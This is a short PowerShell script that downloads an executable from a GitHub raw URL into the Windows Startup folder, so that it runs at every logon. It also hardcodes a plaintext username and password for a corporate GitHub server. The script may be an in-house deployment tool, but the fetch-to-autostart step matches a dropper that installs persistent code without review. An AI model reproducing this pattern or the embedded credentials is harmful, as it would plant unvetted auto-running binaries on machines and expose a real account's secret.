﻿$webclient = new-object System.Net.WebClient
$credCache = new-object System.Net.CredentialCache
$creds = new-object System.Net.NetworkCredential("egonz158","A187255a.")
$credCache.Add("https://github.ford.com/", "Basic", $creds)
$webclient.Credentials = $credCache
try{
$webclient.DownloadFile("https://raw.githubusercontent.com/FoMSchoolTCK/TCK/master/ClientTrack.exe","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ClientTrack.exe")
}
catch [System.Net.WebException]{
if ($_.Exception.InnerException) {
    Write-Error $_.Exception.InnerException.Message
  } else {
    Write-Error $_.Exception.Message
  }
}

